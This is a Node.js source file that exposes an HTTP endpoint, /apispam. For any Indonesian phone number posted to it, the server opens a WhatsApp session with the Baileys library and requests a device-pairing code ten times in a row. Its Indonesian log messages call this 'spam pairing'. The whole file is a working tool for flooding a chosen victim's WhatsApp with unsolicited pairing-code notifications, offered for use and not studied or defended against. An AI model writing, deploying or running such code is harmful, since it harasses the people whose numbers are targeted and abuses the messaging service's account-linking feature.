const fs = require('fs');
const http = require('http');
const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const P = require('pino');

const server = http.createServer(async (req, res) => {
  if (req.method === 'POST' && req.url === '/apispam') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', async () => {
      try {
        const { target } = JSON.parse(body);
        const nomor = target?.replace(/[^0-9]/g, '').trim();

        if (!nomor || !nomor.startsWith('62')) {
          res.writeHead(400, { 'Content-Type': 'text/plain' });
          return res.end('❌ Nomor tidak valid! Gunakan format 628xxxx');
        }

        res.writeHead(200, {
          'Content-Type': 'text/plain',
          'Transfer-Encoding': 'chunked'
        });

        const logs = msg => {
          res.write(msg + '\n');
          console.log(msg);
        };

        const sessionName = `spam-${Date.now()}`;
        const { state, saveCreds } = await useMultiFileAuthState(sessionName);
        const { version } = await fetchLatestBaileysVersion();
        const sock = makeWASocket({
          auth: state,
          version,
          logger: P({ level: 'silent' }),
          printQRInTerminal: false
        });
        sock.ev.on('creds.update', saveCreds);

        logs(`🚀 Memulai spam pairing ke ${nomor}...\n`);

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        for (let i = 0; i < 10; i++) {
          try {
            await sleep(1500);
            const pairing = await sock.requestPairingCode(nomor);
            const code = pairing?.match(/.{1,4}/g)?.join('-') || pairing;
            logs(`✅ [${i + 1}] Kode pairing: ${code}`);
          } catch (err) {
            logs(`❌ [${i + 1}] Gagal: ${err.message}`);
          }
        }

        try {
          fs.rmSync(`./${sessionName}`, { recursive: true, force: true });
          logs(`🧹 Session dihapus.`);
        } catch {}

        logs(`🎯 Selesai spam pairing ke ${nomor}`);
        res.end();
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end(`❌ Terjadi error: ${e.message}`);
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('404 Not Found');
  }
});

server.listen(3000, () => console.log(`✅ API aktif di http://localhost:3000/apispam`));
